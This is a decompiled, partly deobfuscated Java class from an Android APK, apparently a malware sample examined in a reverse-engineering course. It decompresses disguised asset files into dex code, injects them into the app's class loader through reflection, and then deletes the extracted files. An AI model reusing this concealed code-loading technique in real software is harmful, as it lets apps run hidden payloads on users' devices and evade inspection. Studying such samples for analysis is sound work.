package vie.dwhyiud.voxxndgyo.sooyh;

import android.content.Context;
import android.os.Build;
import com.alibaba.android.arouter.utils.Consts;
import eeu.wuekite.ptluwwjmt.ypxjt.ObjectHandler;
import iml.ompdvmx.uqixiejqr.eedej.Decompressor;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import juw.khdqwmf.xftkgphgq.fhyu.mapChineseStringToObject;
import rjg.ugogehh.gxwrstviq.khhf.DexDirHandler;
import vjj.xsflifo.puoiiqxxg.fwrsd.FileDeletionWrapper;

/* compiled from: DexLoader.java */
/* loaded from: /home/davidjosearaujo/Documents/mc/first-year/second-semester/RE/P/re-android-reversing/deofuscation/1_apk/classes.dex */
public class DexLoader {
    private static Context malContext;
    private static final List<File> dexFileList = new ArrayList();

    public DexLoader(Context context) {
        malContext = context;
        File dexDir = DexDirHandler.getDexDir(context);
        FileDeletionWrapper.deleteDirFiles(dexDir.getAbsolutePath());
        FileDeletionWrapper.mkdir(dexDir.getAbsolutePath());
    }

    public void dexFileLoader() {
        try {
            Context context = malContext;
            String[] fileList = context.getAssets().list("iugke");
            File dexDir = DexDirHandler.getDexDir(context);
            for (String dexName : fileList) {
                if (dexName.endsWith(Consts.DOT + "vqr")) {
                    File file = new File(dexDir, dexName);
                    try {
                        Decompressor.inflater(
                                context.getAssets().open("iugke" + "/" + dexName),
                                new FileOutputStream(file));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    dexFileList.add(file);
                }
            }
            dexToObjects(dexDir);
            FileDeletionWrapper.deletePathFiles(dexDir);
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (IllegalAccessException e3) {
            e3.printStackTrace();
        } catch (NoSuchFieldException e4) {
            e4.printStackTrace();
        } catch (NoSuchMethodException e5) {
            e5.printStackTrace();
        } catch (InvocationTargetException e6) {
            e6.printStackTrace();
        }
    }

    private void dexToObjects(File versionDir)
            throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        Method makeDexElements;
        Class<?> componentType;
        Context context = malContext;
        ClassLoader classLoader = context.getClassLoader();
        Field pathListField = ObjectHandler.attributeFinder(classLoader, "pathList");
        Object pathList = pathListField.get(classLoader);
        if (pathList != null) {
            Field dexElementsField = ObjectHandler.attributeFinder(pathList, "dexElements");
            Object[] dexElements = (Object[]) dexElementsField.get(pathList);
            if (Build.VERSION.SDK_INT >= 21 && Build.VERSION.SDK_INT < 23) {
                makeDexElements = ObjectHandler.methodFinder(pathList, "makeDexElements", ArrayList.class, File.class,
                        ArrayList.class);
            } else if (Build.VERSION.SDK_INT < 23) {
                return;
            } else {
                makeDexElements = ObjectHandler.methodFinder(pathList, "makePathElements", List.class, File.class,
                        List.class);
            }
            ArrayList<IOException> suppressedExceptions = new ArrayList<>();
            Object[] addElements = (Object[]) makeDexElements.invoke(pathList, dexFileList, versionDir,
                    suppressedExceptions);
            if (dexElements != null && addElements != null
                    && (componentType = dexElements.getClass().getComponentType()) != null) {
                Object[] newElements = (Object[]) Array.newInstance(componentType,
                        dexElements.length + addElements.length);
                System.arraycopy(dexElements, 0, newElements, 0, dexElements.length);
                System.arraycopy(addElements, 0, newElements, dexElements.length, addElements.length);
                dexElementsField.set(pathList, newElements);
            }
        }
    }
}
